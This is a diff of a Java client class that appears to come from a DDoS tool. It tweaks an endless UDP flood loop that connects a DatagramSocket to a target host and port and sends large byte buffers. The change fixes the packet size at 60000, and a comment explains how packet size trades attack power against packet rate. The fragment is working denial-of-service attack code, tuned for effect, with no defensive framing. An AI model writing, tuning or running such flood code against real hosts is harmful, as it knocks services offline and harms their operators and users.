@@ -95,7 +95,7 @@ public class Client {
 			System.out.println("INFO: Beginning DDOS loop, prepare for slow internet!");
 			while(true) {
 				try {
-					size = rand.nextInt(40000);
+					size = 60000; //Larger size is more powerful attack, smaller size is more packets for a faster attack
 					dSocket = new DatagramSocket();
 					dSocket.connect(InetAddress.getByName(target), port);
 					bytes = new byte[size];
